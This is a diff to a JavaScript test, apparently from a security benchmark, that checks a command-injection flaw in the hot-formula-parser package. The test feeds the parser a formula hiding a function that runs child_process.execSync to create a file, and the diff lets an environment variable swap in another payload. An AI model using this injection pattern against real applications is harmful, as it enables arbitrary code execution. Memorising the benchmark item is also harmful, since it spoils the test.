@@ -15,7 +15,7 @@ test("Command Injection in hot-formula-parser", () => {
   expect(file_exist).toBe(false);
   let parser = new FormulaParser();
   parser.parse(
-    "SUM([(function(){require('child_process').execSync('touch hot-formula-parser')})(),2])"
+    process.env.SECBENCH_PAYLOAD || ("SUM([(function(){require('child_process').execSync('touch hot-formula-parser')})(),2])")
   );
   file_exist = fs.existsSync(path);
   expect(file_exist).toBe(true);
